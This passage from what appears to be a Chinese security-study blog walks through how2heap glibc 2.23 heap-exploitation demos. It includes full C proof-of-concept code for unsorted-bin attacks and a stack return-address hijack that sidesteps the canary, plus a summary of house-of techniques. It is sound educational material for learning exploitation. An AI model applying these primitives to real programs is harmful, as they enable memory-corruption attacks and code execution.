<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                            </span><span class="token punctuation">\</span>
    <span class="token expression">FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>								      </span><span class="token punctuation">\</span>
    <span class="token expression">BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>								      </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>		      </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> </span><span class="token string">"corrupted double-linked list"</span><span class="token expression"><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>								      </span><span class="token punctuation">\</span>
        <span class="token expression">FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>							      </span><span class="token punctuation">\</span>
        <span class="token expression">BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>							      </span><span class="token punctuation">\</span>
        <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>size<span class="token punctuation">)</span>				      </span><span class="token punctuation">\</span>
            <span class="token expression"><span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>		      </span><span class="token punctuation">\</span>
	    <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>	      </span><span class="token punctuation">\</span>
		<span class="token expression"><span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    </span><span class="token punctuation">\</span>
	      <span class="token expression"><span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span>				      </span><span class="token punctuation">\</span>
			       <span class="token string">"corrupted double-linked list (not small)"</span><span class="token expression"><span class="token punctuation">,</span>    </span><span class="token punctuation">\</span>
			       <span class="token expression">P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>					      </span><span class="token punctuation">\</span>
            <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>				      </span><span class="token punctuation">\</span>
                <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span>				      </span><span class="token punctuation">\</span>
                  <span class="token expression">FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>		      </span><span class="token punctuation">\</span>
                <span class="token expression"><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>							      </span><span class="token punctuation">\</span>
                    <span class="token expression">FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>			      </span><span class="token punctuation">\</span>
                    <span class="token expression">FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>			      </span><span class="token punctuation">\</span>
                    <span class="token expression">P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>			      </span><span class="token punctuation">\</span>
                    <span class="token expression">P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>			      </span><span class="token punctuation">\</span>
                  <span class="token expression"><span class="token punctuation">&#125;</span>							      </span><span class="token punctuation">\</span>
              <span class="token expression"><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>							      </span><span class="token punctuation">\</span>
                <span class="token expression">P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>		      </span><span class="token punctuation">\</span>
                <span class="token expression">P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>		      </span><span class="token punctuation">\</span>
              <span class="token expression"><span class="token punctuation">&#125;</span>								      </span><span class="token punctuation">\</span>
          <span class="token expression"><span class="token punctuation">&#125;</span>								      </span><span class="token punctuation">\</span>
      <span class="token expression"><span class="token punctuation">&#125;</span>									      </span><span class="token punctuation">\</span>
<span class="token expression"><span class="token punctuation">&#125;</span></span></span>
</code></pre>

<p>&#x3D;&#x3D;&#x3D;》全局变量chunk0_ptr变成FD的头地址</p>
<p>&#x3D;&#x3D;&#x3D;》接下来通过对chunk0_ptr的修改实现对栈内容的修改</p>
<p>程序中创造了victim_string数组，并覆盖至FD[3]也就是chunk0_ptr这个全局变量&#x3D;&#x3D;》</p>
<p>此时的chunk0_ptr指向数组&#x3D;&#x3D;&#x3D;》接下来通过chunk0赋值0x4141414142424242LL&#x3D;&#x3D;》</p>
<p>将对数组进行赋值操作</p>
<h3 id="unsorted-bin-attack-c"><a href="#unsorted-bin-attack-c" class="headerlink" title="unsorted_bin_attack.c"></a>unsorted_bin_attack.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "</span>
		   <span class="token string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's first look at the target we want to rewrite on stack:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %ld\n\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">,</span> stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we allocate first normal chunk on the heap at: %p\n"</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And allocate another normal chunk in order to avoid consolidating the top chunk with"</span>
           <span class="token string">"the first one during the free()\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "</span>
		   <span class="token string">"point to %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//------------VULNERABILITY-----------</span>

	p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now emulating a vulnerability that can overwrite the victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//------------------------------------</span>

	<span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's malloc again to get the chunk we just free. During this time, the target should have already been "</span>
		   <span class="token string">"rewritten:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请两个chunk，释放第一个chunk p：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220622163451694.png"></p>
<p>修改p的bk指针指向伪造的目标地址chunk：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220622163541856.png"></p>
<p>接下来再申请即可获得目标地址chunk</p>
<h3 id="unsorted-bin-into-stack-c"><a href="#unsorted-bin-into-stack-c" class="headerlink" title="unsorted_bin_into_stack.c"></a>unsorted_bin_into_stack.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">void</span> <span class="token function">jackpot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Nice jump d00d\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token class-name">intptr_t</span> stack_buffer<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocating the victim chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">intptr_t</span><span class="token operator">*</span> victim <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">intptr_t</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Create a fake chunk on the stack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Set size for next allocation and the bk pointer to any writable address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	stack_buffer<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
	stack_buffer<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span>stack_buffer<span class="token punctuation">;</span>

	<span class="token comment">//------------VULNERABILITY-----------</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) &amp;&amp; &lt; av->system_mem\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	victim<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>
	victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span>stack_buffer<span class="token punctuation">;</span> <span class="token comment">// victim->bk is pointing to stack</span>
	<span class="token comment">//------------------------------------</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now next malloc will return the region of our fake chunk: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_buffer<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc(0x100): %p\n"</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">intptr_t</span> sc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span>jackpot<span class="token punctuation">;</span> <span class="token comment">// Emulating our in-memory shellcode</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p2<span class="token operator">+</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sc<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This bypasses stack-smash detection since it jumps over the canary</span>

	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token function">__builtin_return_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>jackpot<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请3个chunk，将中间的chunk victim释放：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220622164445219.png"></p>
<p>篡改victim的size为0x20，bk指针修改为stack_buffer的地址</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220622164947900.png"></p>
<p>之后进行malloc，首先遍历第一个chunk victim，由于size被改小，libc判定空间不足，放入small bin&#x3D;&#x3D;》</p>
<p>遍历fake_chunk(stack_buffer)&#x3D;&#x3D;》申请出来&#x3D;&#x3D;》若此地址在栈上，可以实现劫持返回地址</p>
<h2 id="glibc2-23总结"><a href="#glibc2-23总结" class="headerlink" title="glibc2.23总结"></a>glibc2.23总结</h2><p><strong>fastbin_dup</strong>：fastbin中的double free，只需要在两次free之间进行一次其他chunk的free操作，就可以在fastbin中存放两个相同的chunk</p>
<p><strong>fastbin_dup_consolidate</strong>：在fastbin中有chunk的时候，申请一块大于fastbin范围的chunk，会将fastbin的中的chunk转移，再将原fastbin中的chunk free，实现double free</p>
<p><strong>fastbin_dup_into_stack</strong>：利用fastbin的double free将堆劫持（fd）到栈区，实现在栈区创建chunk</p>
<p><strong>house_of_eiherjar</strong>：通过off by one实现构造fake_chunk通过free合并机制实现地址写</p>
<p><strong>house_of_force</strong>：通过修改top chunk的size成较大值，实现malloc任意地址</p>
<p><strong>house_of_lore</strong>：通过对small bin的头一个chunk的bk指针进行劫持以绕过检查并获得任意地址控制权</p>
<p><strong>house_of_mind_fastbin.c</strong>：伪造一个malloc_state结构体在chunk中，欺骗free将bins链入这个假的arena中&#x3D;&#x3D;》malloc_state就是arena所有字段以及bins的头指针所在地</p>
<p><strong>house_of_orange.c</strong>：通过unsorted bin伪造fake _IO_list_all并引发报错执行_IO_OVERFLOW(system(‘&#x2F;bin&#x2F;sh’))</p>
<p><strong>house_of_roman.c</strong>：在开启PIE后使用的暴力猜解，爆破12位地址</p>
<p><strong>house_of_spirit</strong>：在目标地址伪造chunk并释放，下一次malloc即可分配到目标地址</p>
<p><strong>large_bin_attack.c</strong>：用于在栈区写入较大值</p>
<p><strong>mmap_overlapping_chunks.c</strong>：通过对mmap的chunk的size进行UAF等造成chunk重叠</p>
<p><strong>overlapping_chunks.c</strong>：修改size使堆块重叠</p>
<p><strong>overlapping_chunks_2.c</strong>：堆块重叠</p>
<p><strong>poison_null_byte.c</strong>：通过一个空字节伪造fake_prev_size，使chunk合并，再申请，造成堆叠</p>
<p><strong>unsafe_unlink.c</strong>：unlink实现控制目标地址</p>
<p><strong>unsorted_bin_attack.c</strong>：通过伪造unsorted bin chunk的bk实现申请目标地址</p>
<p><strong>unsorted_bin_into_stack.c</strong>：通过伪造unsorted bin chunk的bk实现申请栈上的地址</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2022/05/07/CVE-2020-24581-CVE-2020-24579/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
              2022-06-22 17:20:42
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="标签"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/pwn-%E5%A0%86/" title="pwn_堆">
                        #pwn_堆
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2022/06/29/How2heap-Glibc2-27/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Glibc-2-23"><span class="toc-text">Glibc_2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-c"><span class="toc-text">fastbin_dup.c</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">总结：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-consolidate-c"><span class="toc-text">fastbin_dup_consolidate.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-into-stack-c"><span class="toc-text">fastbin_dup_into_stack.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-einherjar-c"><span class="toc-text">house_of_einherjar.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-force-c"><span class="toc-text">house_of_force.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-lore-c"><span class="toc-text">house_of_lore.c</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A-1"><span class="toc-text">总结：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-mind-fastbin-c"><span class="toc-text">house_of_mind_fastbin.c</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A-2"><span class="toc-text">总结：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-orange-c"><span class="toc-text">house_of_orange.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-roman-c"><span class="toc-text">house_of_roman.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-spirit-c"><span class="toc-text">house_of_spirit.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-storm-c"><span class="toc-text">house_of_storm.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#large-bin-attack-c"><span class="toc-text">large_bin_attack.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap-overlapping-chunks-c"><span class="toc-text">mmap_overlapping_chunks.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overlapping-chunks-c"><span class="toc-text">overlapping_chunks.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overlapping-chunks-2-c"><span class="toc-text">overlapping_chunks_2.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poison-null-byte-c"><span class="toc-text">poison_null_byte.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsafe-unlink-c"><span class="toc-text">unsafe_unlink.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack-c"><span class="toc-text">unsorted_bin_attack.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-into-stack-c"><span class="toc-text">unsorted_bin_into_stack.c</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#glibc2-23%E6%80%BB%E7%BB%93"><span class="toc-text">glibc2.23总结</span></a></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2024 Closure</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
        
    </div>
  
  
    <div class="footer-views">
      
          本站总访问量<span id="busuanzi_value_site_pv"></span>次
        
      
      
          本站访客数<span id="busuanzi_value_site_uv"></span>人
        
      
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
